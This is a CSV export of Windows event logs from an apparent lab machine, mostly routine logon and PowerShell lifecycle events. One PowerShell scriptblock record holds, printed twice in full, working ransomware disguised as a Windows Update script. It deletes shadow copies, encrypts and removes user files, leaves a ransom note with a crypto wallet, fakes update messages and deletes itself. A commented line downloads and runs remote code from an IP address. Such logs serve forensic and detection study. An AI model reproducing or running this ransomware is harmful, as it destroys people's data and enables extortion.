	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"7,828","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28766,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 15:58:39.594","5XjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 15:58:41.184","Oct 23, 2022 @ 16:16:15.914",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,828","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28767,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 15:58:35.823","43jpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 15:58:37.131","Oct 23, 2022 @ 16:16:15.342",event,"-","Microsoft-Windows-PowerShell",info,"C:\Users\vagrant",ps1,"PSWindowsUpdate.ps1","C:\Users\vagrant\PSWindowsUpdate.ps1","C:\Users\vagrant\PSWindowsUpdate.ps1","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):
<# 
https://www.powershellgallery.com/packages/PSWindowsUpdate/2.2.0.3 
2nd most downloaded package  (last 6 weeks)
#>
# (Invoke-WebRequest http://20.248.172.247/PSWindowsUpdate.txt -UseBasicParsing).Content | Invoke-Expression 

# Variables
$Mode = ""-decrypt""
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like ""*Win*"") {
    $Directory = $env:USERPROFILE
}
$PSRKey = ""1iZVIASo65lqO7s2avHb49J0""
$slash = ""\""
$Readme = ""ransom_readme.txt""
$RansomUserPath = """"

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet(""Encrypt"", ""Decrypt"")]
        [String]$Mode,
 
        [Parameter(Mandatory = $true)]
        [String]$Key,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptText"")]
        [String]$Text,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptFile"")]
        [String]$Path)
 
    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256 
    }
 
    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
        switch ($Mode) {
 
            ""Encrypt"" {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) { break }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + "".canihelpyou"" 
                }
 
                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
 
            ""Decrypt"" {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path <# -ErrorAction SilentlyContinue #>
                    if (!$File.FullName) { break }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName.replace("".canihelpyou"", """") 
                }
 
                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
        }
    }
 
    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

function CreateReadme {
    $ReadmeTXT = ""Your files have been encrypted!`nBut don't worry, you can still recover them with the recovery key :) if you pay `$1,000,000,000 in ETH to 0x8589427373D6D84E98730D7795D8f6f8731FDA16`n""
    if (!(Test-Path ""$Directory$slash$Readme"")) {
        Add-Content -Path ""$Directory$slash$Readme"" -Value $ReadmeTXT 
        Add-Content -Path ""$Directory$slash$Readme"" -Value ""Recovery Key: $PSRKey `n"" 
    }
}
    
function EncryptFiles {
    $ExcludedFilesDirectories = 'C:\Users\UserManager.ps1', 'C:\Users\system.log', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SystemInit.cmd', 'C:\Users\system.conf', '*.canihelpyou', 'ransom_readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -Attributes !System -Exclude $ExcludedFilesDirectories -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
        # Don't encrypt the ransomware first if it is in user folder
        if ($i -ne $PSCommandPath) {
            Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i
        } else {
            $RansomUserPath = $i
        }
        Remove-Item $i 
    }
}

function DeleteShadows {
    # Requires administrator privileges
    Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
}

function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.canihelpyou | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
        Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace("".canihelpyou"", """")
        Write-Host ""[+] $rfile is now decrypted"" -ForegroundColor Cyan 
    } ; Remove-Item ""$Directory$slash$Readme"" 
}

function CheckFiles { 
    $RFiles = Get-ChildItem $Directory  -Attributes !System -Recurse -filter *.canihelpyou ; if ($RFiles) { $RFiles | Remove-Item } else {
        Write-Host ""[!] No encrypted files has been found!"" -ForegroundColor Red 
    }
}

if ($Mode -eq ""-decrypt"") { 
    Write-Host ; Write-Host ""[!] Recovering ransomware infection on $DirectoryTarget directory.."" -ForegroundColor Red
    Write-Host ""[i] Applying recovery key on encrypted files.."" -ForegroundColor Green
    DecryptFiles ; CheckFiles
}
  
else {
    Write-Host ; Write-Host ""Checking for Windows updates via Windows Update Client..."" -ForegroundColor Cyan
    if ($OSVersion -like ""*Win*"") {
        DeleteShadows
    }
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object { [char]$_ })
    Start-Sleep 1
    Write-Host ""Checking file hashes for Windows updates..."" -ForegroundColor Cyan
    CreateReadme
    EncryptFiles
    Start-Sleep 1

    Write-Host ""Saving Windows update status..."" -ForegroundColor Cyan
    Start-Sleep 2
    Write-Host ""Completed. No Windows updates were found."" -ForegroundColor Green
    # Self Delete
    if ($PSCommandPath -ne """") {
        rm $PSCommandPath -Force
    }
}

ScriptBlock ID: c661e770-7b61-4d60-84fd-50d413f88d40
Path: C:\Users\vagrant\PSWindowsUpdate.ps1","c661e770-7b61-4d60-84fd-50d413f88d40","<# 
https://www.powershellgallery.com/packages/PSWindowsUpdate/2.2.0.3 
2nd most downloaded package  (last 6 weeks)
#>
# (Invoke-WebRequest http://20.248.172.247/PSWindowsUpdate.txt -UseBasicParsing).Content | Invoke-Expression 

# Variables
$Mode = ""-decrypt""
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like ""*Win*"") {
    $Directory = $env:USERPROFILE
}
$PSRKey = ""1iZVIASo65lqO7s2avHb49J0""
$slash = ""\""
$Readme = ""ransom_readme.txt""
$RansomUserPath = """"

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet(""Encrypt"", ""Decrypt"")]
        [String]$Mode,
 
        [Parameter(Mandatory = $true)]
        [String]$Key,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptText"")]
        [String]$Text,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptFile"")]
        [String]$Path)
 
    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256 
    }
 
    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
        switch ($Mode) {
 
            ""Encrypt"" {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) { break }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + "".canihelpyou"" 
                }
 
                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
 
            ""Decrypt"" {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path <# -ErrorAction SilentlyContinue #>
                    if (!$File.FullName) { break }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName.replace("".canihelpyou"", """") 
                }
 
                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
        }
    }
 
    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

function CreateReadme {
    $ReadmeTXT = ""Your files have been encrypted!`nBut don't worry, you can still recover them with the recovery key :) if you pay `$1,000,000,000 in ETH to 0x8589427373D6D84E98730D7795D8f6f8731FDA16`n""
    if (!(Test-Path ""$Directory$slash$Readme"")) {
        Add-Content -Path ""$Directory$slash$Readme"" -Value $ReadmeTXT 
        Add-Content -Path ""$Directory$slash$Readme"" -Value ""Recovery Key: $PSRKey `n"" 
    }
}
    
function EncryptFiles {
    $ExcludedFilesDirectories = 'C:\Users\UserManager.ps1', 'C:\Users\system.log', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SystemInit.cmd', 'C:\Users\system.conf', '*.canihelpyou', 'ransom_readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -Attributes !System -Exclude $ExcludedFilesDirectories -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
        # Don't encrypt the ransomware first if it is in user folder
        if ($i -ne $PSCommandPath) {
            Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i
        } else {
            $RansomUserPath = $i
        }
        Remove-Item $i 
    }
}

function DeleteShadows {
    # Requires administrator privileges
    Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
}

function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.canihelpyou | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
        Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace("".canihelpyou"", """")
        Write-Host ""[+] $rfile is now decrypted"" -ForegroundColor Cyan 
    } ; Remove-Item ""$Directory$slash$Readme"" 
}

function CheckFiles { 
    $RFiles = Get-ChildItem $Directory  -Attributes !System -Recurse -filter *.canihelpyou ; if ($RFiles) { $RFiles | Remove-Item } else {
        Write-Host ""[!] No encrypted files has been found!"" -ForegroundColor Red 
    }
}

if ($Mode -eq ""-decrypt"") { 
    Write-Host ; Write-Host ""[!] Recovering ransomware infection on $DirectoryTarget directory.."" -ForegroundColor Red
    Write-Host ""[i] Applying recovery key on encrypted files.."" -ForegroundColor Green
    DecryptFiles ; CheckFiles
}
  
else {
    Write-Host ; Write-Host ""Checking for Windows updates via Windows Update Client..."" -ForegroundColor Cyan
    if ($OSVersion -like ""*Win*"") {
        DeleteShadows
    }
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object { [char]$_ })
    Start-Sleep 1
    Write-Host ""Checking file hashes for Windows updates..."" -ForegroundColor Cyan
    CreateReadme
    EncryptFiles
    Start-Sleep 1

    Write-Host ""Saving Windows update status..."" -ForegroundColor Cyan
    Start-Sleep 2
    Write-Host ""Completed. No Windows updates were found."" -ForegroundColor Green
    # Self Delete
    if ($PSCommandPath -ne """") {
        rm $PSCommandPath -Force
    }
}",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0000-94b0-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","5,024","1,796","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3311,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 15:58:18.230","4njpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",8224,"Oct 23, 2022 @ 15:58:19.202","-",event,"-",VSS,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"The VSS service is shutting down due to idle timeout. ","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-",2D20436F64653A2020434F525356434330303030303737342D2043616C6C3A2020434F525356434330303030303735362D205049443A202030303030323330302D205449443A202030303030303833322D20434D443A2020433A5C57696E646F77735C73797374656D33325C76737376632E6578652020202D20557365723A204E616D653A204E5420415554484F524954595C53595354454D2C205349443A532D312D352D313820,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",8224,Classic,"-","-","-","-","-",Info,"-","-","-",VSS,3897,"-","-","-","-","-","-"
"Oct 23, 2022 @ 15:58:15.523","4XjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 15:58:16.250","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=cf841369-fd63-48c5-9b38-87fec7c5968d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=cf841369-fd63-48c5-9b38-87fec7c5968d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4553,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 15:58:15.435","4HjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 15:58:16.250","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4552,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 15:58:15.423","33jpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 15:58:16.250","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4551,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 15:58:15.401","3njpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 15:58:16.250","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4550,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 15:58:15.398","3XjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 15:58:16.250","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4549,"Provider Lifecycle","-","-","-","-","-"
